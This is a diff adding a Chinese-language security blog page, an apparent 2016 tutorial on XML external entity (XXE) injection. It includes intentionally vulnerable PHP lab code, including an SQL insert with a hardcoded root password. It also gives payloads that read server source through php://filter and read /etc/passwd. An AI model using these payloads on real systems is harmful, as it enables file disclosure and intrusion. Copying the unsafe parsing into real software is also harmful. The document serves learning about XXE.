@@ -1,0 +1,689 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="XML注入," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="PS：最近一直在搭建漏洞环境，在过程中有些环境特别难搭建各种折腾，个人觉得搭建漏洞环境看一个人的基础水平，如果水平好些搭的漏洞环境会快一些， 我个人觉得自己的基础还不错，先不说难折腾的环境，简单的环境可以一天搭建5个。可能没有搭建过漏洞环境的人不知道有多蛋疼。你可能在搭建运行平台或者LAMP或者其它tomcat、weblogic之类的过程中会遇到各种各样的错，然后你就去解决，等解决了好久才把某个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML注入笔记">
+<meta property="og:url" content="http://yoursite.com/2016/06/16/XML注入笔记/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="PS：最近一直在搭建漏洞环境，在过程中有些环境特别难搭建各种折腾，个人觉得搭建漏洞环境看一个人的基础水平，如果水平好些搭的漏洞环境会快一些， 我个人觉得自己的基础还不错，先不说难折腾的环境，简单的环境可以一天搭建5个。可能没有搭建过漏洞环境的人不知道有多蛋疼。你可能在搭建运行平台或者LAMP或者其它tomcat、weblogic之类的过程中会遇到各种各样的错，然后你就去解决，等解决了好久才把某个">
+<meta property="og:image" content="http://evilanne.github.io/images/xml1.png">
+<meta property="og:updated_time" content="2016-06-16T13:15:55.974Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XML注入笔记">
+<meta name="twitter:description" content="PS：最近一直在搭建漏洞环境，在过程中有些环境特别难搭建各种折腾，个人觉得搭建漏洞环境看一个人的基础水平，如果水平好些搭的漏洞环境会快一些， 我个人觉得自己的基础还不错，先不说难折腾的环境，简单的环境可以一天搭建5个。可能没有搭建过漏洞环境的人不知道有多蛋疼。你可能在搭建运行平台或者LAMP或者其它tomcat、weblogic之类的过程中会遇到各种各样的错，然后你就去解决，等解决了好久才把某个">
+<meta name="twitter:image" content="http://evilanne.github.io/images/xml1.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> XML注入笔记 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                XML注入笔记
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-06-16T21:04:38+08:00" content="2016-06-16">
+              2016-06-16
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/06/16/XML注入笔记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/16/XML注入笔记/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<p>PS：最近一直在搭建漏洞环境，在过程中有些环境特别难搭建各种折腾，个人觉得搭建漏洞环境看一个人的基础水平，如果水平好些搭的漏洞环境会快一些， 我个人觉得自己的基础还不错，先不说难折腾的环境，简单的环境可以一天搭建5个。可能没有搭建过漏洞环境的人不知道有多蛋疼。<br>你可能在搭建运行平台或者LAMP或者其它tomcat、weblogic之类的过程中会遇到各种各样的错，然后你就去解决，等解决了好久才把某个程序装上去之后你才发现并没有漏洞。所以就要从头再来。用了12天，搭建了21个环境。越到后面越难，在此过程中我也学习了很多之前没有接触过的，蛋疼是另外一回事，能学习到新东西也是另外一回事。</p>
+<hr>
+<p>XML注入我看老外的文章已经是2008年了，然而再搜索一下国内的最早是在2011在90sec上面看到的，其它在wooyun、其它的平台14年才有相关的文章和攻击方法。 先不说国内怎样，想想自己所学的东西到底是落后别人几年了，差距不是一点点，而是一大节。真的要好好反思一下自己了。</p>
+<a id="more"></a>
+<p><br><br><br></p>
+<h3 id="XML是什么"><a href="#XML是什么" class="headerlink" title="XML是什么"></a>XML是什么</h3><p>XML可扩展标记语言（eXtensible Markup Language，XML）可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p>包含内部实体的XML文档： </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY copyright "Copyright wiki.wooyun.org"&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">internal</span>&gt;</span>&amp;copyright;<span class="tag">&lt;/<span class="name">internal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span>		#XML声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE entity[]&gt;</span>		#文档类型定义</span><br><span class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span>					#文档元素</span><br><span class="line">  <span class="tag">&lt;<span class="name">internal</span>&gt;</span>&amp;copyright;<span class="tag">&lt;/<span class="name">internal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<p>包含外部实体的XML文档：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY wiki SYSTEM "http://baidu.com/a.dtd"&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">external</span>&gt;</span>&amp;wiki;<span class="tag">&lt;/<span class="name">external</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="XML安全"><a href="#XML安全" class="headerlink" title="XML安全"></a>XML安全</h3><p>漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。</p>
+<p>内部实体文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY copyright "Copyright wiki.wooyun.org"&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">internal</span>&gt;</span>&amp;copyright;<span class="tag">&lt;/<span class="name">internal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>外部实体文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY wiki SYSTEM "http://baidu.com/a.dtd"&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">external</span>&gt;</span>&amp;wiki;<span class="tag">&lt;/<span class="name">external</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="XML、XXE区别"><a href="#XML、XXE区别" class="headerlink" title="XML、XXE区别"></a>XML、XXE区别</h4><p>我看到有些文章提及XML注入或者XXE注入，所以我一直在搞混了，它们到底有什么区别嘛，最后看别人文章都会提及这一点：“XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击”，也问了一些人XXE和XML的区别就是， 没有区别。</p>
+<p>真实答案是不是这样我不清楚，如果错了这就尴尬了</p>
+<h3 id="XML注入实验代码"><a href="#XML注入实验代码" class="headerlink" title="XML注入实验代码"></a>XML注入实验代码</h3><p>先是一个上传页面的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;Html&gt;</span><br><span class="line"></span><br><span class="line">	&lt;body&gt;</span><br><span class="line"></span><br><span class="line">		&lt;h1&gt;Procesar XML&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">		&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"></span><br><span class="line">			&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;Archivo XML:&lt;/label&gt;</span><br><span class="line"></span><br><span class="line">			&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;</span><br><span class="line"></span><br><span class="line">			&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Enviar"</span>&gt;</span><br><span class="line"></span><br><span class="line">		&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">		&lt;h1&gt;Resultados&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>]) &amp;&amp; $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"text/xml"</span>)&#123;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">	        <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">	        <span class="comment">//echo "Upload: " . $_FILES["file"]["name"] . "&lt;br /&gt;";</span></span><br><span class="line"></span><br><span class="line">	        <span class="comment">//echo "Type: " . $_FILES["file"]["type"] . "&lt;br /&gt;";</span></span><br><span class="line"></span><br><span class="line">	        <span class="comment">//echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb&lt;br /&gt;";</span></span><br><span class="line"></span><br><span class="line">	        <span class="comment">//echo "Temp file: " . $_FILES["file"]["tmp_name"] . "&lt;br /&gt;";</span></span><br><span class="line"></span><br><span class="line">	            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line"></span><br><span class="line">	                <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"></span><br><span class="line">	            <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line"></span><br><span class="line">	                     </span><br><span class="line"></span><br><span class="line">	           $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line"></span><br><span class="line">	           $direct = <span class="string">"upload/"</span>;</span><br><span class="line"></span><br><span class="line">	           $xmlfile = $direct . $filename;</span><br><span class="line"></span><br><span class="line">	           <span class="keyword">if</span>(file_exists($xmlfile))&#123;</span><br><span class="line"></span><br><span class="line">	               $xml = simplexml_load_file($xmlfile);</span><br><span class="line"></span><br><span class="line">	               var_dump($xml);</span><br><span class="line"></span><br><span class="line">	           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">	               <span class="keyword">exit</span>(<span class="string">'Error.'</span>);</span><br><span class="line"></span><br><span class="line">	           &#125;</span><br><span class="line"></span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>构造一个xml注入payload：<br>意思是将uploadxml.php文件转换为base64编码，因为XML读取的时候碰到 “&lt;” 等一些符号会报错。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=uploadxml.php" &gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://evilanne.github.io/images/xml1.png" alt="http://evilanne.github.io/images/xml1.png"><br>可以看到把base64转换一下就可以看到文件源码了。</p>
+<p>另外一段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form action=<span class="string">"xmlsqlinject.php"</span>&gt;</span><br><span class="line"></span><br><span class="line">            &lt;input type=<span class="string">"text"</span> name=<span class="string">"txt"</span>&gt;</span><br><span class="line"></span><br><span class="line">            &lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=gbk"</span>);</span><br><span class="line"></span><br><span class="line">$str = $_GET[<span class="string">'txt'</span>];</span><br><span class="line"></span><br><span class="line">$openfile = fopen(<span class="string">"test.xml"</span>,<span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line"></span><br><span class="line">fwrite($openfile,$str);</span><br><span class="line"></span><br><span class="line">fclose($openfile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$conn = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>,<span class="string">"test"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Connect Error"</span>);</span><br><span class="line"></span><br><span class="line">$db = mysql_select_db(<span class="string">"test"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"No Database"</span>);</span><br><span class="line"></span><br><span class="line">$xml = simplexml_load_file(<span class="string">"test.xml"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($xml-&gt;children() <span class="keyword">as</span> $child)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:red;\"&gt;"</span> . $child . <span class="string">"&lt;/span&gt;&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $inssql=<span class="string">"insert into test (name) values ('$child')"</span>;</span><br><span class="line"></span><br><span class="line">    $ok = mysql_query($inssql,$conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($ok)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//echo "执行成功本条sql语句为：&lt;br&gt;&lt;hr&gt;$inssql&lt;/hr&gt;";</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"执行成功"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"></span><br><span class="line">CREATE TABLE IF NOT EXISTS `test` (</span><br><span class="line"></span><br><span class="line">  `name` varchar(255) NOT NULL</span><br><span class="line"></span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在输入框中输入：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=uploadxml.php" &gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一样可以获取到base64编码进行转换得到源码</p>
+<h3 id="XML注入可以做什么"><a href="#XML注入可以做什么" class="headerlink" title="XML注入可以做什么"></a>XML注入可以做什么</h3><p>从上面可以看到，这不就是相当于文件包含么？<br>确实可以这么理解，但我搭建漏洞环境的时候找了一套源码死活复现不了，可能技术太渣了。<br>除了读文件包呢？</p>
+<p>文件读取：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>拒绝服务:<br>(未测试)</p>
